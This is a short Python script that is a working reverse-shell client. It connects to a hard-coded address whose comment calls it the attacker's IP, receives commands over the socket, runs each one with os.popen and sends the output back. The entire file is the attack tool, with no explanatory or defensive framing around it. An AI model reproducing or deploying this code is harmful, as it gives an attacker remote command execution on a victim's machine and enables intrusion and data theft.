import socket
import os

CLIENT_HOST = "10.224.0.5"  # Replace with your attacker's IP
CLIENT_PORT = 8888
BUFFER_SIZE = 1024

# Create a socket object
s = socket.socket()

# Connect to the server
s.connect((CLIENT_HOST, CLIENT_PORT))

while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # execute the command and retrieve the results
    output = os.popen(command).read()
    # send the results back to the server
    s.send(output.encode())
# close client connection
s.close()
